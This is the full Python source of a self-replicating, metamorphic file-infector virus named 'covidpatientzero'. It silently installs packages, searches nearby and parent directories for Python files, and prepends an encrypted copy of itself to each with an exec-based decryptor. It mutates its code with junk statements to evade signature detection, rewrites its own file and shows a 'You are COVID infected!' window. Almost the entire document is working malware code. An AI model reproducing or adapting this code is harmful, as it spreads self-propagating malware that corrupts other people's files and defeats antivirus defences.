# covidpatientzero
####### VIRUS START #######
import io
from pathlib import Path
import hashlib
import base64
import random

import os
import sys

# change this value to define the path depth (all the directories in the current directory including the .. parent directory) to which files will be infected starting from the current directory. a value of zero means that only files in the currentwill be infected
DEPTH = 0

# check if a module is installed
def module_installed(module):
    try:
        exec('import %s'%(module))
        return True
    except:
        return False

# import pip if installed to install other modules
if module_installed('pip'):    
    import pip

# import conda if installed to install other modules
if module_installed('conda'):
    import conda.cli

# install a module using pip or conda
def install_module(module):    
    stdout_orig = sys.stdout
    stderr_orig = sys.stderr
    
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    try:
        pip.main(['install',module])
        pass
    except:
        try:
            conda.cli.main('conda','install','-y',module)        
        except:
            dummy = 'dummy'
            pass
    finally:    
        sys.stdout = stdout_orig
        sys.stderr = stderr_orig
        pass
    



# generate hash of fine_name to be placed as first line of infected file to mark that file is already infected
def gen_marker(file_name):
    md5 = hashlib.md5()
    md5.update(file_name.encode())
    base_64 = base64.b64encode(md5.digest())
    return '# ' + base_64.decode() + '\n'

# infect python_file with virus_content and mark file as infected    
def infect_file_inplace(python_file, virus_content):
    with open(python_file, 'r') as file:
        file_name = python_file.split('\\')[-1]
        marker = gen_marker(file_name)
        
        first_line = file.readline()
        if first_line == marker or first_line == '# covidpatientzero\n':
            return 
        file.seek(0,0)
        file_content = file.read()
               
    with open(python_file, 'w') as file:
        file.write(marker)            
        for i in range(len(virus_content)):
            file.write(virus_content[i])        
        file.write(file_content)   
         
        
# return parent path
def gen_parent_path(path):
    path_split = path.split('\\')
    parent_path = ''
    
    for i in range(len(path_split) - 1):
        parent_path = parent_path + path_split[i] 
        
        if i < len(path_split) - 2: 
            parent_path = parent_path + '\\'
    
    return parent_path

# return absolute path of dirr based on parent path
def abs_path(parent_path_abs, dirr):
    return parent_path_abs + '\\' + dirr  


# remove non virus content from virus and return only the virus part
def remove_non_virus_content(virus):
    virus = io.StringIO(virus)
    virus_content = []
    for line in virus:
        virus_content.append(line)
    
    i_virus_start = None
    i_virus_end = None
    
    for i in range(len(virus_content)):
        if '####### VIRUS START #######' in virus_content[i] and i_virus_start == None:
            i_virus_start = i
            
        if '####### VIRUS END #######' in virus_content[i]:
            i_virus_end = i + 1 
    
    virus_content = virus_content[i_virus_start:i_virus_end]
    virus_content = ''.join(virus_content)
    virus.seek(0,0)
    return virus_content

# generate list of python files to infect using breath first search. iterations is the number of folders to visit and if iterations = 0, only return files in current folder
def gen_files_list(iterations=0):
    current_dir = os.path.abspath(os.getcwd())   
        
    python_files = []
    
    queue = []
    visited = []   
        
    current_files = os.listdir(current_dir)   
    current_python_files = [abs_path(current_dir, file) for file in current_files if os.path.isfile(abs_path(current_dir, file)) and (file.endswith('.py') or file.endswith('.pyw')) and abs_path(current_dir, file) not in python_files]    
    python_files = python_files + current_python_files
       
    current_dirs = [abs_path(current_dir, file) for file in current_files if os.path.isdir(abs_path(current_dir, file))]
    if(os.path.isdir(gen_parent_path(current_dir))):
        current_dirs.append(gen_parent_path(current_dir))

    queue = queue + current_dirs
    
    visited.append(current_dir)
    
    while(len(queue)!=0):
        
        if iterations <=0:
            break
        
        iterations = iterations - 1
              
        current_dir = queue.pop(0)
                
        try:
            current_files = os.listdir(current_dir)
        except:
            continue
            
        current_python_files = [abs_path(current_dir, file) for file in current_files if os.path.isfile(abs_path(current_dir, file)) and (file.endswith('.py') or file.endswith('.pyw')) and abs_path(current_dir, file) not in python_files]
        python_files = python_files + current_python_files
        
        current_dirs = [abs_path(current_dir, file) for file in current_files if os.path.isdir(abs_path(current_dir, file))]
        if(os.path.isdir(gen_parent_path(current_dir))):
            current_dirs.append(gen_parent_path(current_dir))
        
        for i in range(len(current_dirs)):
            if current_dirs[i] not in visited:
                visited.append(current_dirs[i])
                queue.append(current_dirs[i])
        
    python_files.remove(os.path.abspath(__file__))
        
    return python_files


# encrypt virus and return the string virus_decryptor which includes the encrypted_virus and code to decrypt. virus_decryptor is later placed on files to be infected
def encrypt_virus(virus):
    # encrypt virus_content (use fernet encryption)
    key = Fernet.generate_key()
    f = Fernet(key)
    encrypted_virus = f.encrypt(virus.encode())
    virus_decryptor = '''
import os
import sys

def module_installed(module):
    try:
        exec('import %%s'%%(module))
        return True
    except:
        return False

if module_installed('pip'):    
    import pip

if module_installed('conda'):
    import conda.cli

def install_module(module):    
    stdout_orig = sys.stdout
    stderr_orig = sys.stderr
    
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    try:
        pip.main(['install',module])
        pass
    except:
        try:
            conda.cli.main('conda','install','-y',module)        
        except:
            dummy='dummy'
    finally:    
        sys.stdout = stdout_orig
        sys.stderr = stderr_orig
        pass

awake = True
if not module_installed('cryptography'):    
    install_module('cryptography')
if module_installed('cryptography'):     
    from cryptography.fernet import Fernet
else:
    awake = False

if awake:
    f = Fernet(%s)
    encrypted_virus = %s
    virus = f.decrypt(encrypted_virus)
    exec(virus)
    propagate(virus.decode())
''' %(key, encrypted_virus)    
    return virus_decryptor

# virus payload which simply displays message
def payload(message):
    window = tk.Tk()
    
    var = tk.StringVar()
    label = tk.Message(window, textvariable = var, relief=tk.RAISED)
    
    var.set(message)
    label.pack()
    window.mainloop()
    
# function name is explanatory. this function is used to make sure that useless code is inserted with the right identation
def count_leading_white_space(string):
    count = 0
    for i in range(len(string)):
        if string[i] == ' ':
            count = count + 1
        else:    
            break
    return count

# return True with probability prob_true. this function is used to make code mutation random
def random_decision(prob_true = 0.5):
    random_float = random.random()
    return True if random_float < prob_true else False

# randomly remove empty lines. each empty line is kept with probability prob_keep and removed with probability 1 - prob_keep
def rem_random_empty_lines(virus_list, prob_keep=0.2):
    virus_morphed_list = []
    for i in range(len(virus_list)):
        if virus_list[i].strip()!='':
            virus_morphed_list.append(virus_list[i])
        else:
            if random_decision(prob_keep):
                virus_morphed_list.append(virus_list[i])
    return virus_morphed_list

# randomly add empty lines. for each line, an empty line is added with probability prob_add
def add_random_empty_lines(virus_list, prob_add=0.2):
    virus_morphed_list = []
    for i in range(len(virus_list)):
        if i!=0 and random_decision(prob_add):
            virus_morphed_list.append('\n')
        
        virus_morphed_list.append(virus_list[i])
    
    return virus_morphed_list

# randomly add pass statements. for each line, a pass statement is added with probability prob_add
def add_random_pass_statements(virus_list, prob_add=0.2):
    virus_morphed_list = []
    for i in range(len(virus_list)):
        if i!=0: 
            if next_line_random_writable(virus_list[i-1]):
                if random_decision(prob_add):
                    leading_white_space = count_leading_white_space(virus_list[i-1])*' '
                    virus_morphed_list.append(leading_white_space+'pass#\n')
                    
        virus_morphed_list.append(virus_list[i])
    
    return virus_morphed_list

# check if random code can be written below code in string without breaking entire code due to identation
def next_line_random_writable(string):
    if len(string.strip())!=0 and string.strip()[-1]!=':' and "'''" not in string:
        return True
    else:
        return False

# check if code in string is variable assignment
def is_assignment(string):
    if '=' in string and string.strip()[-1] != ':' and '(' not in string and ')' not in string:
        return True
    else:
        False

# check if code in string is useless created by morphing engine, of the type reduntant reassignment such as x = x
def is_redundant_assignment(string):
    string = string.strip().replace(' ','').replace('#','')
    string_list = string.split('=')
    
    if len(string_list) != 2:
        return False
    
    lhs = string_list[0]
    rhs = string_list[1]
    if is_assignment(string) and lhs == rhs:
        return True
    else:
        return False

# check if code in string is useless variable created by morphing engine
def is_useless_variable(string):
    string = string.strip()
    if len(string)==0 or string[-1] != '#':
        return False
    
    string = string.replace(' ','').replace('#','')
    string_list = string.split('=')
    
    if len(string_list) != 2:
        return False
    
    lhs = string_list[0]
    rhs = string_list[1]
    
    if is_assignment(string) and len(lhs) == 50 and rhs.isnumeric():
        return True
    else:
        return False
    
# return variable name from variable assignment
def extract_variable_name_from_assignment(assignment_string):
    if not is_assignment(assignment_string):
        return 'dummy'
    assignment_string = assignment_string.replace(' ','')
    variable_name = assignment_string.split('=')[0]
    return variable_name

# randomly add redundant reassignments of the type x = x below variable assignments ending with pound sign. for each variable assignment, redundant reassignment is added with probability prob_add
def add_random_redundant_reassignments(virus_list, prob_add=0.5):
    virus_morphed_list = []
    for i in range(len(virus_list)):
        if i!=0: 
            if next_line_random_writable(virus_list[i-1]) and is_assignment(virus_list[i-1]) and not is_useless_variable(virus_list[i-1]):
                if random_decision(prob_add):
                    variable_name = extract_variable_name_from_assignment(virus_list[i-1])
                    leading_white_space = count_leading_white_space(virus_list[i-1])*' '
                    virus_morphed_list.append(leading_white_space + variable_name+' = '+variable_name+'#\n')
                    
        virus_morphed_list.append(virus_list[i])
    
    return virus_morphed_list    

# randomly add useless variables ending with pound sign. for each line, useless variable is added with probability prob_add
def add_random_useless_variable(virus_list, prob_add=0.2, variable_length=50, variable_value_range=1000):
    virus_morphed_list = []
    for i in range(len(virus_list)):
        if i!=0: 
            if next_line_random_writable(virus_list[i-1]):
                if random_decision(prob_add):
                    leading_white_space = count_leading_white_space(virus_list[i-1])*' '
                    variable_value = random.randrange(0, variable_value_range, 1)
                    virus_morphed_list.append(leading_white_space + gen_random_string(variable_length) + ' = ' + str(variable_value) + '#\n')
                    
        virus_morphed_list.append(virus_list[i])
    
    return virus_morphed_list

# randomly remove useless variables. each useless variable is kept with probability prob_keep and removed with probability 1 - prob_keep
def rem_random_useless_variable(virus_list, prob_keep=0.15):
    virus_morphed_list = []
    for i in range(len(virus_list)):
        if not is_useless_variable((virus_list[i])) or virus_list[i].strip()[-1]!='#':
            virus_morphed_list.append(virus_list[i])
        else:
            if random_decision(prob_keep):
                virus_morphed_list.append(virus_list[i])
    return virus_morphed_list

# randomly remove redundant reassignments. each redundant reassignment is kept with probability prob_keep and removed with probability 1 - prob_keep
def rem_random_redundant_reassignments(virus_list, prob_keep=0.4):
    virus_morphed_list = []
    for i in range(len(virus_list)):
        if is_redundant_assignment(virus_list[i]) and virus_list[i].strip()[-1]=='#':
            if random_decision(prob_keep):
                virus_morphed_list.append(virus_list[i])
        else:
            virus_morphed_list.append(virus_list[i])
    return virus_morphed_list

# randomly remove pass statements. each pass statement is kept with probability prob_keep and removed with probability 1 - prob_keep
def rem_random_pass_statements(virus_list, prob_keep=0.2):
    virus_morphed_list = []
    for i in range(len(virus_list)):
        if virus_list[i].strip()!='pass#':
            virus_morphed_list.append(virus_list[i])
        else:
            if random_decision(prob_keep):
                virus_morphed_list.append(virus_list[i])
    return virus_morphed_list

# generate random string of length n to be used as name for useless variables
def gen_random_string(n=50):
    if n <= 0:
        return ''
    
    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
    random_string = []
    
    for i in range(n):
        i_random = random.randrange(0, len(alphabet), 1)
        if len(random_string) == 0:
            while(alphabet[i_random].isnumeric()):
                i_random = random.randrange(0, len(alphabet), 1)
            random_string.append(alphabet[i_random])
        else:
            random_string.append(alphabet[i_random])
        
    return ''.join(random_string)

# create morphed version of script by changing its code while maintaining semantic
def metamorphic_engine(original):
    morphed_list = [line for line in io.StringIO(original)]
    
    morphed_list = rem_random_empty_lines(morphed_list, prob_keep=0.01)
    morphed_list = add_random_empty_lines(morphed_list, prob_add=0.5)
    
    morphed_list = rem_random_pass_statements(morphed_list, prob_keep=0.01)
    morphed_list = add_random_pass_statements(morphed_list, prob_add=0.3)
    
    morphed_list = rem_random_redundant_reassignments(morphed_list, prob_keep=0.01)
    morphed_list = add_random_redundant_reassignments(morphed_list, prob_add=0.5)
    
    morphed_list = rem_random_useless_variable(morphed_list, prob_keep=0.01)
    morphed_list = add_random_useless_variable(morphed_list, prob_add=0.1)
    
    
    morphed = ''.join(morphed_list)
    
    return morphed

# infect files in python_files and run payload 
def propagate(virus):
    if awake:
        virus = remove_non_virus_content(virus)
        python_files = gen_files_list(iterations = DEPTH)
        
        for i in range(len(python_files)):
            virus_content = [line for line in io.StringIO(encrypt_virus(metamorphic_engine(virus)))]        
            infect_file_inplace(python_files[i], virus_content)
    
        payload('You are COVID infected!')
        
# if necessary modules are not installed do nothing
awake = True
if not module_installed('cryptography'):    
    install_module('cryptography')
if module_installed('cryptography'):     
    from cryptography.fernet import Fernet
else:
    awake = False
    
if not module_installed('tkinter'):    
    install_module('tkinter')
if module_installed('tkinter'):     
    import tkinter as tk
else:
    awake = False
####### VIRUS END #######

# if necessary modules are installed, run virus by propagating it, running payload and morphing original code
if awake:
    with open(__file__) as self_file:
        self_content = self_file.read()
        propagate(self_content)
        morphed_content = metamorphic_engine(self_content)
        
    with open(__file__, 'w') as morphed:
        morphed.write(morphed_content)